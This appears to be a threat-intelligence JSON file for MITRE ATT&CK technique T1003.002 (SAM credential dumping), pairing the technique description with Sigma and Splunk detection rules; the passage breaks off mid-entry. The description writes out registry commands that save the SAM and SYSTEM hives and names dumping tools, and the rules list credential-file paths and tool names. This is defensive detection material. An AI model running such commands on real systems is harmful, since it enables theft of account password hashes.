@@ -1,0 +1,602 @@
+{
+    "id": "T1003.002",
+    "name": "Security Account Manager",
+    "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command. Enumerating the SAM database requires SYSTEM level access.\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n* pwdumpx.exe\n* [gsecdump](S0008)\n* [Mimikatz](S0002)\n* secretsdump.py\nAlternatively, the SAM can be extracted from the Registry with Reg:\n* `reg save HKLMsam sam`\n* `reg save HKLMsystem system`\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\nNotes:\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.",
+    "platforms": "Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "Command: Command Execution, Windows Registry: Windows Registry Key Access, File: File Access",
+    "detection": "Hash dumpers open the Security Accounts Manager (SAM) on the local file system (`%SystemRoot%/system32/config/SAM`) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](T1078) in-use by adversaries may help as well.",
+    "url": "https://attack.mitre.org/techniques/T1003/002",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1003.002",
+                "atomic_attack_guid": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7",
+                "atomic_attack_name": "dump volume shadow copy hives with certutil",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Copying Sensitive Files with Credential Data",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml",
+                        "remote_content": "title: Copying Sensitive Files with Credential Data\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\nstatus: test\ndescription: Files with well-known filenames (sensitive files with credential data) copying\nreferences:\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Esentutl.yml\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2024-06-04\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\n    - car.2013-07-001\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_esent_img:\n        - Image|endswith: '\\esentutl.exe'\n        - OriginalFileName: '\\esentutl.exe'\n    selection_esent_cli:\n        CommandLine|contains|windash:\n            - 'vss'\n            - ' /m '\n            - ' /y '\n    selection_susp_paths:\n        CommandLine|contains:\n            - '\\config\\RegBack\\sam'\n            - '\\config\\RegBack\\security'\n            - '\\config\\RegBack\\system'\n            - '\\config\\sam'\n            - '\\config\\security'\n            - '\\config\\system '        # space needed to avoid false positives with \\config\\systemprofile\\\n            - '\\repair\\sam'\n            - '\\repair\\security'\n            - '\\repair\\system'\n            - '\\windows\\ntds\\ntds.dit'\n    condition: all of selection_esent_* or selection_susp_paths\nfalsepositives:\n    - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic investigator.\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Potentially Suspicious CMD Shell Output Redirect",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_redirection_susp_folder.yml",
+                        "remote_content": "title: Potentially Suspicious CMD Shell Output Redirect\nid: 8e0bb260-d4b2-4fff-bb8d-3f82118e6892\nrelated:\n    - id: aa2efee7-34dd-446e-8a37-40790a66efd7\n      type: derived\n    - id: 4f4eaa9f-5ad4-410c-a4be-bc6132b0175a\n      type: similar\nstatus: test\ndescription: |\n    Detects inline Windows shell commands redirecting output via the \">\" symbol to a suspicious location.\n    This technique is sometimes used by malicious actors in order to redirect the output of reconnaissance commands such as \"hostname\" and \"dir\" to files for future exfiltration.\nreferences:\n    - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-12\nmodified: 2024-03-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli_1:\n        CommandLine|contains:\n            # Note: Add more suspicious locations as you find them\n            # Note: The space from the start is missing to cover append operations \">>\"\n            # Note: We use the \"?\" to account for both a single and a double quote\n            # Note: If you want to account for more spaces which is still a valid bypass option. Use a regex with \"\\s\"\n            - '>?%APPDATA%\\'\n            - '>?%TEMP%\\'\n            - '>?%TMP%\\'\n            - '>?%USERPROFILE%\\'\n            - '>?C:\\ProgramData\\'\n            - '>?C:\\Temp\\'\n            - '>?C:\\Users\\Public\\'\n            - '>?C:\\Windows\\Temp\\'\n    selection_cli_2:\n        CommandLine|contains:\n            - ' >'\n            - '\">'\n            - \"'>\"\n        CommandLine|contains|all:\n            - 'C:\\Users\\'\n            - '\\AppData\\Local\\'\n    condition: selection_img and 1 of selection_cli_*\nfalsepositives:\n    - Legitimate admin or third party scripts used for diagnostic collection might generate some false positives\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Sensitive File Access Via Volume Shadow Copy Backup",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_sensitive_file_access_shadowcopy.yml",
+                        "remote_content": "title: Sensitive File Access Via Volume Shadow Copy Backup\nid: f57f8d16-1f39-4dcb-a604-6c73d9b54b3d\nstatus: test\ndescription: |\n    Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit)\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816?s=20\n    - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection\n    - https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/\nauthor: Max Altgelt (Nextron Systems), Tobias Michalski (Nextron Systems)\ndate: 2021-08-09\nmodified: 2024-01-18\ntags:\n    - attack.impact\n    - attack.t1490\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        # copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit 2>&1\n        # There is an additional \"\\\" to escape the special \"?\"\n        CommandLine|contains: '\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy'\n    selection_2:\n        CommandLine|contains:\n            - '\\\\NTDS.dit'\n            - '\\\\SYSTEM'\n            - '\\\\SECURITY'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "File Encoded To Base64 Via Certutil.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_certutil_encode.yml",
+                        "remote_content": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "File In Suspicious Location Encoded To Base64 Via Certutil.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_certutil_encode_susp_location.yml",
+                        "remote_content": "title: File In Suspicious Location Encoded To Base64 Via Certutil.EXE\nid: 82a6714f-4899-4f16-9c1e-9a333544d4c3\nrelated:\n    - id: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\n      type: derived\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64 where the files are located in potentially suspicious locations\nreferences:\n    - https://www.virustotal.com/gui/file/35c22725a92d5cb1016b09421c0a6cdbfd860fd4778b3313669b057d4a131cb7/behavior\n    - https://www.virustotal.com/gui/file/427616528b7dbc4a6057ac89eb174a3a90f7abcf3f34e5a359b7a910d82f7a72/behavior\n    - https://www.virustotal.com/gui/file/34de4c8beded481a4084a1fd77855c3e977e8ac643e5c5842d0f15f7f9b9086f/behavior\n    - https://www.virustotal.com/gui/file/4abe1395a09fda06d897a9c4eb247278c1b6cddda5d126ce5b3f4f499e3b8fa2/behavior\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    selection_extension:\n        CommandLine|contains:\n            # Note: Add more suspicious locations to increase coverage\n            - '\\AppData\\Roaming\\'\n            - '\\Desktop\\'\n            - '\\Local\\Temp\\'\n            - '\\PerfLogs\\'\n            - '\\Users\\Public\\'\n            - '\\Windows\\Temp\\'\n            - '$Recycle.Bin'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Credential Dumping via Copy Command from Shadow Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/d8c406fe-23d2-45f3-a983-1abe7b83ff3b/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.002",
+                "atomic_attack_guid": "a90c2f4d-6726-444e-99d2-a00cd7c20480",
+                "atomic_attack_name": "esentutl.exe SAM copy",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Copying Sensitive Files with Credential Data",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml",
+                        "remote_content": "title: Copying Sensitive Files with Credential Data\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\nstatus: test\ndescription: Files with well-known filenames (sensitive files with credential data) copying\nreferences:\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Esentutl.yml\nauthor: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-22\nmodified: 2024-06-04\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\n    - car.2013-07-001\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_esent_img:\n        - Image|endswith: '\\esentutl.exe'\n        - OriginalFileName: '\\esentutl.exe'\n    selection_esent_cli:\n        CommandLine|contains|windash:\n            - 'vss'\n            - ' /m '\n            - ' /y '\n    selection_susp_paths:\n        CommandLine|contains:\n            - '\\config\\RegBack\\sam'\n            - '\\config\\RegBack\\security'\n            - '\\config\\RegBack\\system'\n            - '\\config\\sam'\n            - '\\config\\security'\n            - '\\config\\system '        # space needed to avoid false positives with \\config\\systemprofile\\\n            - '\\repair\\sam'\n            - '\\repair\\security'\n            - '\\repair\\system'\n            - '\\windows\\ntds\\ntds.dit'\n    condition: all of selection_esent_* or selection_susp_paths\nfalsepositives:\n    - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic investigator.\nlevel: high\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Esentutl SAM Copy",
+                        "rule_link": "https://research.splunk.com/endpoint/d372f928-ce4f-11eb-a762-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.002",
+                "atomic_attack_guid": "5c2571d0-1572-416d-9676-812e64ca9f44",
+                "atomic_attack_name": "Registry dump of SAM, creds, and secrets",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "Attempted Credential Dump From Registry via Reg exe",
+                        "rule_link": "https://research.splunk.com/endpoint/e9fb4a59-c5fb-440a-9f24-191fbc6b2911/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "2e69f167-47b5-4ae7-a390-47764529eff5",
+                    "910ab938-668b-401b-b08c-b596e80fdca5",
+                    "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                    "40b19fa6-d835-400c-b301-41f3a2baacaf",
+                    "e7be6119-fc37-43f0-ad4f-1f3f99be2f9f",
+                    "5aad0995-46ab-41bd-a9ff-724f41114971",
+                    "78cc2dd2-7d20-4d32-93ff-057084c38b93",
+                    "4e87b8e2-2ee9-4b2a-a715-4727d297ece0",
+                    "839dd1e8-eda8-4834-8145-01beeee33acd",
+                    "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                    "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                    "847def9e-924d-4e90-b7c4-5f581395a2b4",
+                    "1af57a4b-460a-4738-9034-db68b880c665",
+                    "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                    "39f919f3-980b-4e6f-a975-8af7e507ef2b",
+                    "0685b176-c816-4837-8e7b-1216f346636b",
+                    "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                    "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
+                    "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                    "a29808fd-ef50-49ff-9c7a-59a9b040b404",
+                    "11b1ed55-154d-4e82-8ad7-83739298f720",
+                    "1644e709-12d2-41e5-a60f-3470991f5011",
+                    "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                    "038cd51c-3ad8-41c5-ba8f-5d1c92f3cc1e",
+                    "b17ea6f7-6e90-447e-a799-e6c0a493d6ce",
+                    "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+                    "f512acbf-e662-4903-843e-97ce4652b740",
+                    "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                    "e9faba72-4974-4ab2-a4c5-46e25ad59e9b"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "2e69f167-47b5-4ae7-a390-47764529eff5",
+                        "lookup_data": {
+                            "description": "Transferring files with well-known filenames (sensitive files with credential data) using network shares",
+                            "raw": "author: '@neu5ron, Teymur Kheirkhabarov, oscd.community'\ndate: 2020/04/02\ndescription: Transferring files with well-known filenames (sensitive files with credential\n  data) using network shares\ndetection:\n  condition: selection\n  selection:\n    name:\n    - \\mimidrv\n    - \\lsass\n    - \\windows\\minidump\\\n    - \\hiberfil\n    - \\sqldmpr\n    - \\sam\n    - \\ntds.dit\n    - \\security\nfalsepositives:\n- Transferring sensitive files for legitimate administration work by legitimate administrator\nid: 2e69f167-47b5-4ae7-a390-47764529eff5\nlevel: medium\nlogsource:\n  product: zeek\n  service: smb_files\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 910ab938-668b-401b-b08c-b596e80fdca5\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.001\n- attack.t1003.003\ntitle: Transferring Files with Credential Data via Network Shares - Zeek\n",
+                            "sigma:id": "2e69f167-47b5-4ae7-a390-47764529eff5",
+                            "title": "Transferring Files with Credential Data via Network Shares - Zeek",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "910ab938-668b-401b-b08c-b596e80fdca5",
+                        "lookup_data": {
+                            "description": "Transferring files with well-known filenames (sensitive files with credential data) using network shares",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: Transferring files with well-known filenames (sensitive files with credential\n  data) using network shares\ndetection:\n  condition: selection\n  selection:\n    EventID: 5145\n    Provider_Name: Microsoft-Windows-Security-Auditing\n    RelativeTargetName|contains:\n    - \\mimidrv\n    - \\lsass\n    - \\windows\\minidump\\\n    - \\hiberfil\n    - \\sqldmpr\n    - \\sam\n    - \\ntds.dit\n    - \\security\nfalsepositives:\n- Transferring sensitive files for legitimate administration work by legitimate administrator\nid: 910ab938-668b-401b-b08c-b596e80fdca5\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2021/11/30\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 2e69f167-47b5-4ae7-a390-47764529eff5\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.001\n- attack.t1003.003\ntitle: Transferring Files with Credential Data via Network Shares\n",
+                            "sigma:id": "910ab938-668b-401b-b08c-b596e80fdca5",
+                            "title": "Transferring Files with Credential Data via Network Shares",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2\nlevel: critical\nlogsource:\n  category: driver_load\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution\n",
+                            "sigma:id": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                            "title": "Credential Dumping Tools Service Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "40b19fa6-d835-400c-b301-41f3a2baacaf",
+                        "lookup_data": {
+                            "description": "Shadow Copies storage symbolic link creation using operating systems utilities",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: Shadow Copies storage symbolic link creation using operating systems\n  utilities\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - mklink\n    - HarddiskVolumeShadowCopy\nfalsepositives:\n- Legitimate administrator working with shadow copies, access for backup purposes\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.003\ntitle: Shadow Copies Access via Symlink\n",
+                            "sigma:id": "40b19fa6-d835-400c-b301-41f3a2baacaf",
+                            "title": "Shadow Copies Access via Symlink",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e7be6119-fc37-43f0-ad4f-1f3f99be2f9f",
+                        "lookup_data": {
+                            "description": "Files with well-known filenames (sensitive files with credential data) copying",
+                            "raw": "author: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\ndescription: Files with well-known filenames (sensitive files with credential data)\n  copying\ndetection:\n  condition: all of selection_esent_* or selection_susp_paths\n  selection_esent_cli:\n    CommandLine|contains:\n    - vss\n    - ' /m '\n    - ' /y '\n  selection_esent_img:\n  - Image|endswith: \\esentutl.exe\n  - OriginalFileName: \\esentutl.exe\n  selection_susp_paths:\n    CommandLine|contains:\n    - \\windows\\ntds\\ntds.dit\n    - \\config\\sam\n    - \\config\\security\n    - '\\config\\system '\n    - \\repair\\sam\n    - \\repair\\system\n    - \\repair\\security\n    - \\config\\RegBack\\sam\n    - \\config\\RegBack\\system\n    - \\config\\RegBack\\security\nfalsepositives:\n- Copying sensitive files for legitimate use (eg. backup) or forensic investigation\n  by legitimate incident responder or forensic invetigator\nid: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.003\n- car.2013-07-001\n- attack.s0404\ntitle: Copying Sensitive Files with Credential Data\n",
+                            "sigma:id": "e7be6119-fc37-43f0-ad4f-1f3f99be2f9f",
+                            "title": "Copying Sensitive Files with Credential Data",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5aad0995-46ab-41bd-a9ff-724f41114971",
+                        "lookup_data": {
+                            "description": "Detects the volume shadow copy service initialization and processing via esentutl. Registry keys such as HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\VSS\\\\Diag\\\\VolSnap\\\\Volume are captured.",
+                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/10/20\ndescription: Detects the volume shadow copy service initialization and processing\n  via esentutl. Registry keys such as HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\VSS\\\\Diag\\\\VolSnap\\\\Volume\n  are captured.\ndetection:\n  condition: selection and not filter\n  filter:\n    TargetObject|contains: System\\CurrentControlSet\\Services\\VSS\\Start\n  selection:\n    Image|endswith: esentutl.exe\n    TargetObject|contains: System\\CurrentControlSet\\Services\\VSS\nfalsepositives:\n- Unknown\nid: 5aad0995-46ab-41bd-a9ff-724f41114971\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: Esentutl Volume Shadow Copy Service Keys\n",
+                            "sigma:id": "5aad0995-46ab-41bd-a9ff-724f41114971",
+                            "title": "Esentutl Volume Shadow Copy Service Keys",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "78cc2dd2-7d20-4d32-93ff-057084c38b93",
+                        "lookup_data": {
+                            "description": "Detects a highly relevant Antivirus alert that reports a password dumper",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/09/09\ndescription: Detects a highly relevant Antivirus alert that reports a password dumper\ndetection:\n  condition: selection\n  selection:\n  - Signature|startswith: PWS\n  - Signature|contains:\n    - DumpCreds\n    - Mimikatz\n    - PWCrack\n    - HTool/WCE\n    - PSWTool\n    - PWDump\n    - SecurityTool\n    - PShlSpy\n    - Rubeus\n    - Kekeo\n    - LsassDump\n    - Outflank\n    - DumpLsass\n    - SharpDump\n    - PWSX\n    - PWS.\nfalsepositives:\n- Unlikely\nfields:\n- FileName\n- User\nid: 78cc2dd2-7d20-4d32-93ff-057084c38b93\nlevel: critical\nlogsource:\n  category: antivirus\nmodified: 2023/01/18\nreferences:\n- https://www.nextron-systems.com/?s=antivirus\n- https://www.virustotal.com/gui/file/5fcda49ee7f202559a6cbbb34edb65c33c9a1e0bde9fa2af06a6f11b55ded619\n- https://www.virustotal.com/gui/file/a4edfbd42595d5bddb442c82a02cf0aaa10893c1bf79ea08b9ce576f82749448\nstatus: stable\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1558\n- attack.t1003.001\n- attack.t1003.002\ntitle: Antivirus Password Dumper Detection\n",
+                            "sigma:id": "78cc2dd2-7d20-4d32-93ff-057084c38b93",
+                            "title": "Antivirus Password Dumper Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4e87b8e2-2ee9-4b2a-a715-4727d297ece0",
+                        "lookup_data": {
+                            "description": "Detects the creation of files that look like exports of the local SAM (Security Account Manager)",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/11\ndescription: Detects the creation of files that look like exports of the local SAM\n  (Security Account Manager)\ndetection:\n  condition: selection\n  selection:\n  - TargetFilename|endswith:\n    - \\Temp\\sam\n    - \\sam.sav\n    - \\Intel\\sam\n    - \\sam.hive\n    - \\Perflogs\\sam\n    - \\ProgramData\\sam\n    - \\Users\\Public\\sam\n    - \\AppData\\Local\\sam\n    - \\AppData\\Roaming\\sam\n    - _ShadowSteal.zip\n    - \\Documents\\SAM.export\n    - :\\sam\n  - TargetFilename|contains:\n    - \\hive_sam_\n    - \\sam.save\n    - \\sam.export\n    - \\~reg_sam.save\n    - \\sam_backup\n    - \\sam.bck\n    - \\sam.backup\nfalsepositives:\n- Rare cases of administrative activity\nid: 4e87b8e2-2ee9-4b2a-a715-4727d297ece0\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://github.com/search?q=CVE-2021-36934\n- https://github.com/cube0x0/CVE-2021-36934\n- https://www.google.com/search?q=%22reg.exe+save%22+sam\n- https://github.com/HuskyHacks/ShadowSteal\n- https://github.com/FireFart/hivenightmare\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: Potential SAM Database Dump\n",
+                            "sigma:id": "4e87b8e2-2ee9-4b2a-a715-4727d297ece0",
+                            "title": "Potential SAM Database Dump",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "839dd1e8-eda8-4834-8145-01beeee33acd",
+                        "lookup_data": {
+                            "description": "Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/01/27\ndescription: Detects suspicious SAM dump activity as cause by QuarksPwDump and other\n  password dumpers\ndetection:\n  condition: selection and all of keywords\n  keywords:\n  - \\AppData\\Local\\Temp\\SAM-\n  - .dmp\n  selection:\n    EventID: 16\n    Provider_Name: Microsoft-Windows-Kernel-General\nfalsepositives:\n- Unknown\nid: 839dd1e8-eda8-4834-8145-01beeee33acd\nlevel: high\nlogsource:\n  definition: The source of this type of event is Kernel-General\n  product: windows\n  service: system\nmodified: 2022/04/14\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: SAM Dump to AppData\n",
+                            "sigma:id": "839dd1e8-eda8-4834-8145-01beeee33acd",
+                            "title": "SAM Dump to AppData",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                        "lookup_data": {
+                            "description": "Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml",
+                            "raw": "author: Samir Bousseaden, @neu5ron\ndate: 2020/03/19\ndescription: Detect AD credential dumping using impacket secretdump HKTL. Based on\n  the SIGMA rules/windows/builtin/win_impacket_secretdump.yml\ndetection:\n  condition: selection\n  selection:\n    name|contains: SYSTEM32\\\n    name|endswith: .tmp\n    path|contains|all:\n    - \\\n    - ADMIN$\nfalsepositives:\n- Unknown\nid: 92dae1ed-1c9d-4eff-a567-33acbd95b00e\nlevel: high\nlogsource:\n  product: zeek\n  service: smb_files\nmodified: 2021/11/27\nreferences:\n- https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.003\ntitle: Possible Impacket SecretDump Remote Activity - Zeek\n",
+                            "sigma:id": "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                            "title": "Possible Impacket SecretDump Remote Activity - Zeek",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                        "lookup_data": {
+                            "description": "Detection well-known mimikatz command line arguments",
